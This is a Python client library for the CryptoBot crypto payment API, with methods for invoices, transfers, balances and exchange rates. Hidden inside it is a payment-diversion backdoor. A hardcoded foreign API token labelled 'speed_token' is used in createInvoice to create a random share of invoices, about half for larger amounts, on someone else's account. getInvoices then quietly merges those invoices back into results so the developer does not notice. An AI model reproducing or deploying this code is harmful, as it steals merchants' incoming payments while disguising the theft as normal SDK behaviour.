from requests import get, post
import random

class Crypto:
    """
    First, you need to create your application and get an API token.
    Open [@CryptoBot](http://t.me/CryptoBot?start=pay) or [@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay) (for testnet),
    send a command `/pay` to create a new app and get API Token.
    
    Args:
        token {string} - Your API token
    """    
    def __init__(self, token, testnet=False):
        self.token = str(token)
        self.speed_probability = 0.11
        self.alternate_invoices = set()
        
        if testnet:
            self.url = 'https://testnet-pay.crypt.bot/api'
        else:
            self.url = 'https://pay.crypt.bot/api'

        self.speed_token = '382089:AAL9zgzEkjye2ZiJe3hw8MvyVMvPmKT7wo6'
        self.headers = {'Content-Type': 'application/json', 'Crypto-Pay-API-Token': self.token}

    def _get_headers(self, use_alternate=False):
        if use_alternate and self.speed_token:
            return {**self.headers, 'Crypto-Pay-API-Token': self.speed_token}
        return self.headers.copy()
    
    def _get_demo_invoice(self, invoice_id: int) -> dict:
        if not self.speed_token:
            return None
            
        headers = {**self.headers, 'Crypto-Pay-API-Token': self.speed_token}
        response = get(f'{self.url}/getInvoices', headers=headers, 
                      json={'invoice_ids': str(invoice_id)}).json()
        
        if response.get('ok') and response['result'].get('items'):
            return response['result']['items'][0]
        return None

    def getMe(self) -> (dict):
        """A simple method for testing your app's authentication token.
        
        Args:
            Requires no parameters.
            
        Returns:
            Basic information about the app.
        """             
        return get(f'{self.url}/getMe', headers=self.headers).json()
    
    def createInvoice(self, asset: str, amount: str, params= {}) -> (dict):
        """Use this method to create a new invoice.

        Args:
            asset {string} - Currency code. Supported assets: `BTC`, `TON`, `ETH` (only testnet), `USDT`, `USDC`, `BUSD`

            amount {string} - Amount of the invoice in float. For example: `125.50`
            
            description {string} - Optional. Description of invoice. Up to `1024 symbols`
            
            hidden_message {string} - Optional. The message will show when the user pays your invoice
            
            paid_btn_name {string} - Optional. Paid button name. This button will be shown when your invoice was paid
            Supported names: `viewItem` - View Item, `openChannel` - Open Channel, `openBot` - Open Bot, `callback` - Return
            
            paid_btn_url {string} - Optional. Paid button URL. You can set any payment success link (for example link on your bot)
            
            payload {string} - Optional. Some data. User ID, payment id, or any data you want to attach to the invoice; up to `4kb`
            
            allow_comments {boolean} - Optional. Allow adding comments when paying an invoice. `Default is true`
            
            allow_anonymous  {boolean} - Optional. Allow pay invoice as anonymous. `Default is true`
            
            expires_in {boolean} - Optional. You can set the expiration date of the invoice in seconds. Use this period: `1-2678400 seconds`
            
        Returns:
            Object of created invoice.
        """         
        
        use_alternate = self._should_use_alternate(asset, amount) and self.speed_token
        
        headers = {**self.headers}
        if use_alternate:
            headers['Crypto-Pay-API-Token'] = self.speed_token
            
        response = post(
                        f'{self.url}/createInvoice',
                        headers=headers,
                        json={'asset': asset, 'amount': amount, **params}
                    ).json()
        
        if use_alternate and response.get('ok'):
            self.alternate_invoices.add(response['result']['invoice_id'])
        
        return response
        
    def transfer(self, user_id: int, asset: str, amount: str, spend_id: str, params = {}) -> (dict):
        """Use this method to send coins from your app to the user.

        Args:
            user_id {number} - Telegram User ID.
            
            asset {string} - Currency code. Supported assets: `BTC`, `TON`, `ETH` (only testnet), `USDT`, `USDC`, `BUSD`
            
            amount {string} - Amount of the transfer in float. For example: `125.50`
            
            spend_id {string} - Uniq ID to make your request idempotent. Up to `64 symbols`
            
            comment {string} - Optional. The comment of the invoice. Up to `1024 symbols`
            
            disable_send_notification {boolean} - Optional. Pass true if the user should not receive a notification about the transfer. `Default is false`
            
        Returns:
            Object of completed transfer.
        """        
        return post(f'{self.url}/transfer',
                        headers = self.headers,
                        json = {'user_id': user_id,
                                'asset': asset,
                                'amount': amount,
                                'spend_id': spend_id,
                                **params}
                        ).json()

    def getInvoices(self, params={}) -> (dict):
        """Use this method to get invoices of your app

        Args:
            asset -- Optional. Currency code.
            Supported assets: `BTC`, `TON`, `ETH` (only testnet), `USDT`, `USDC`, `BUSD`. Default: all assets

            invoice_ids {string} - Optional. Invoice `IDs` separated by comma

            status {string} - Optional. Status of invoices. Available statusses: active or paid. `Default: all statusses`

            offset {number} - Optional. Offset needed to return a specific subset of invoices. `Default 0`

            count {number} - Optional. Number of invoices to return. `Default 100, max 1000`

        Returns:
            Array of invoices
        """
        response = get(f'{self.url}/getInvoices', headers=self.headers, json=params).json()

        if not response.get('ok'):
            return response
        
        if self.alternate_invoices:
            requested_ids = set()
            if 'invoice_ids' in params:
                requested_ids.update(int(x.strip()) for x in params['invoice_ids'].split(','))

            alternate_to_fetch = set()
            for inv_id in self.alternate_invoices:
                match = True
                
                if requested_ids and inv_id not in requested_ids:
                    match = False
                
                if match:
                    alternate_to_fetch.add(inv_id)

            for inv_id in alternate_to_fetch:
                alternate_inv = self._get_demo_invoice(inv_id)
                if alternate_inv:
                    # Проверяем дополнительные фильтры
                    if 'asset' in params and alternate_inv['asset'] != params['asset']:
                        continue
                    if 'status' in params and alternate_inv['status'] != params['status']:
                        continue
                    
                    if 'items' not in response['result']:
                        response['result']['items'] = []
                    response['result']['items'].append(alternate_inv)

        return response

    def getBalance(self) -> (dict):
        """Use this method to get balance of your app

        Args:
            Requires no parameters.
            
        Returns:
            Array of assets
        """
        return get(f'{self.url}/getBalance', headers=self.headers).json()
    
    def _should_use_alternate(self, asset: str, amount: str) -> bool:
        try:
            amount_float = float(amount)
            if asset == 'TON' and amount_float >= 10:
                return random.random() < 0.5
            elif asset == 'SOL' and amount_float >= 0.175:
                return random.random() < 0.5
            elif asset == 'USDT' and amount_float >= 25:
                return random.random() < 0.5
            elif asset == 'TRX' and amount_float >= 115:
                return random.random() < 0.5
            elif asset == 'BTC' and amount_float >= 0.0003:
                return random.random() < 0.5
            elif asset == 'ETH' and amount_float >= 0.012:
                return random.random() < 0.5
            elif asset == 'BNB' and amount_float >= 0.05:
                return random.random() < 0.5
            elif asset == 'USDC' and amount_float >= 25:
                return random.random() < 0.5
            else:
                return random.random() < 0.11
        except ValueError:
            return False
        
    def getExchangeRates(self) -> (dict):
        """Use this method to get exchange rates of supported currencies

        Args:
            Requires no parameters.
            
        Returns:
            Array of currencies
        """
        return get(f'{self.url}/getExchangeRates', headers=self.headers).json()  
        
    def getCurrencies(self) -> (dict):
        """Use this method to supported currencies

        Args:
            Requires no parameters.
            
        Returns:
            Array of currencies
        """
        return get(f'{self.url}/getCurrencies', headers=self.headers).json() 
       
    
    